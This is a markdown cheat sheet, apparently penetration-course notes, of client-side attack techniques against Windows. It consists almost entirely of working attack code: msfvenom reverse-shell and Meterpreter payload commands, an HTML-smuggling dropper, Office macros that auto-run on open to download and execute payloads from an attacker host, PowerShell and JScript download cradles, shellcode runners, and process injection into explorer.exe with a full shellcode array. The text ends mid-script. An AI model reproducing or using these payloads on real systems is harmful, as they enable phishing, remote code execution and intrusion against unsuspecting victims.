# Client Side Code Execution With Office

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
```

```bash
nc -nvlp 444
```

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
```

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.50.1;set LPORT 443;run;"
```

## HTML Smuggling

### smuggling.html

```html
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
			/* msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
			base64 msfstaged.exe */
			
      		var file ='TVqQAAMAAAAEAAAA...'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
			// Google Chrome
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
			
			// Microsoft Edge
			// window.navigator.msSaveBlob(blob, filename);
        </script>
    </body>
</html>
```

## Phishing with Microsoft Office

Save our document in a Macro-Enabled format such as .doc or .docm. The newer .docx will not store macros.

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## Phishing PreTexting

1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
2. In the Create New Building Block dialog box, we'll enter the name "`TheDoc`"

```VB
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub
```

## VBA Shellcode Runner

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
```

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, ...)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Porting Shellcode Runner to PowerShell

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

### run.txt
```pwsh
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

```VB
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Reflection Shellcode Runner in PowerShell

### run2.txt
```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## PowerShell Proxy-Aware Communication

The proxy settings used by **Net.WebClient** are stored in the .**proxy** property and are populated from the **DefaultWebProxy** property when creating the object.

View these settings using the **GetProxy** method by specifying the URL to test against.

```pwsh
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
```

Since the proxy settings are configured dynamically through the proxy property, we can remove them by simply creating an empty object

```pwsh
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Fiddling With The User-Agent

```pwsh
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Give Me A SYSTEM Proxy
A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.

```bat
PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
```

To run our session through a proxy, we must create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account on the system.

Proxy settings for each user are stored in the registry at the following path:
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`

When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.

The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs.

As part of our download cradle, use PowerShell to resolve a registry key. But the HKEY_USERS registry hive is not automatically mapped. 
=>
Map it with the **New-PSDrive** commandlet by specifying a name, the PSProvider as "Registry", and Root as "HKEY_USERS".

The HKEY_USERS hive contains the hives of all users on the computer, including SYSTEM and other local service accounts, which we want to avoid.

The registry hives are divided and named after the SIDs of existing users and there is a specific pattern.

Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.

To obtain a valid user hive, loop through all top level entries of the HKEY_USERS until we find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving only the SID, while omitting the HKEY_USERS string.

```pwsh
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```

# Client Side Code Execution With Windows Script Host
The default application for .js files is the Windows-Based Script Host

## Jscript Meterpreter Dropper

### run.js
```js
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

Modify the Jscript code to make it proxy-aware with the **setProxy** method

### run2.js
```js
var url = "http://192.168.119.120/shell.exe"
var Object = WScript.CreateObject("MSXML2.ServerXMLHTTP");
Object.setProxy(2, "192.168.X.12:3128", "")

Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("shell.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
```

## Shellcode Runner in C#

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Jscript Shellcode Runner
```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
		//MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

		// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
        byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
	}

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
```bat
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

## SharpShooter

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o shell.txt
```

```bash
sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

## Reflective Load
### Class1.cs
```csharp
using System;
using System.Runtime.InteropServices;


namespace ReflectiveLoad
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

```pwsh
# (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
# $assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("ReflectiveLoad.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Process Injection and Migration
## Process Injection in C#
Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, but there are a few others to consider.
### VirtualAllocEx and WriteProcessMemory
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection2
{
    class Program
    {
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
		static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes,	ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtMapViewOfSection(IntPtr SectionHandle,	IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits,	UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize,	uint InheritDisposition, uint AllocationType, uint Win32Protect);
	
		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		static void Main(string[] args)
        {
			byte[] buf = new byte[809] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
			0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
			0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
			0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
			0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
			0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
			0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
			0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
			0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
			0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,
			0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
			0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
			0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
			0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
			0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
			0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
			0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
			0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
			0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
			0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
			0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
			0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
			0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
			0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
			0x2e,0x34,0x35,0x2e,0x31,0x39,0x39,0x00,0x5a,0x48,0x89,0xc1,
			0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
			0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
			0x00,0xff,0xd5,0xe8,0xfe,0x00,0x00,0x00,0x2f,0x77,0x4e,0x75,
			0x65,0x69,0x71,0x35,0x44,0x5a,0x30,0x55,0x44,0x52,0x67,0x4a,
			0x45,0x5a,0x65,0x64,0x47,0x36,0x77,0x33,0x4c,0x48,0x4f,0x62,
			0x61,0x4a,0x63,0x41,0x55,0x5a,0x64,0x44,0x7a,0x41,0x32,0x6f,
			0x59,0x4b,0x49,0x58,0x7a,0x6f,0x42,0x48,0x61,0x48,0x59,0x6c,
			0x70,0x44,0x30,0x63,0x72,0x75,0x78,0x78,0x45,0x36,0x54,0x62,
			0x48,0x57,0x52,0x54,0x49,0x48,0x6e,0x73,0x55,0x30,0x56,0x78,
			0x34,0x4c,0x4c,0x58,0x2d,0x6f,0x4c,0x46,0x77,0x48,0x49,0x5f,
			0x62,0x48,0x44,0x50,0x30,0x38,0x4f,0x64,0x33,0x42,0x4f,0x54,
			0x5f,0x38,0x70,0x63,0x36,0x78,0x4a,0x48,0x52,0x59,0x4c,0x43,
			0x51,0x37,0x34,0x53,0x37,0x34,0x38,0x34,0x68,0x38,0x58,0x70,
			0x57,0x58,0x4a,0x74,0x51,0x44,0x69,0x6e,0x52,0x74,0x4d,0x53,
			0x61,0x61,0x6e,0x47,0x39,0x79,0x35,0x52,0x61,0x4b,0x65,0x31,
			0x7a,0x58,0x37,0x61,0x49,0x72,0x4e,0x54,0x72,0x36,0x45,0x4b,
			0x45,0x73,0x4b,0x78,0x39,0x38,0x75,0x49,0x61,0x52,0x4c,0x4f,
			0x6a,0x37,0x70,0x45,0x62,0x2d,0x55,0x69,0x43,0x73,0x33,0x76,
			0x47,0x44,0x64,0x46,0x59,0x67,0x55,0x37,0x66,0x71,0x34,0x30,
			0x70,0x54,0x77,0x76,0x71,0x58,0x44,0x70,0x69,0x74,0x4f,0x66,
			0x43,0x63,0x68,0x4f,0x67,0x5a,0x2d,0x59,0x45,0x42,0x54,0x76,
			0x48,0x62,0x61,0x77,0x63,0x63,0x33,0x55,0x7a,0x70,0x7a,0x69,
			0x69,0x79,0x48,0x57,0x30,0x4b,0x35,0x59,0x37,0x79,0x74,0x6f,
			0x4d,0x42,0x74,0x38,0x62,0x78,0x77,0x64,0x4e,0x00,0x48,0x89,
			0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
			0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,
			0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,
			0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,
			0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,
			0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
			0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,
			0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,
			0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,
			0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,
			0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
			0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,
			0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,
			0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,
			0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,
			0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
			0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,
			0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,
			0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

			uint buffer_size = (uint)buf.Length;

			// Create the section handle.
			IntPtr ptr_section_handle = IntPtr.Zero;
			UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
			if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
				return;

			// Map a view of a section into the virtual address space of the current process.
			ulong section_offset = 0;
			IntPtr ptr_local_section_addr = IntPtr.Zero;
			UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x04);
			if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
				return;

			// Copy the shellcode into the mapped section.
			Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

			// Map a view of the section in the virtual address space of the targeted process.
			Process[] expProc = Process.GetProcessesByName("explorer");
			int pid = expProc[0].Id;
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
			IntPtr ptr_remote_section_addr = IntPtr.Zero;
			uint remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x20);
			if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
				return;

			// Unmap the view of the section from the current process & close the handle.
			NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
			NtClose(ptr_section_handle);
			CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
		}
    }
}

```

## Process Injection in PowerShell
### run3.txt
```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
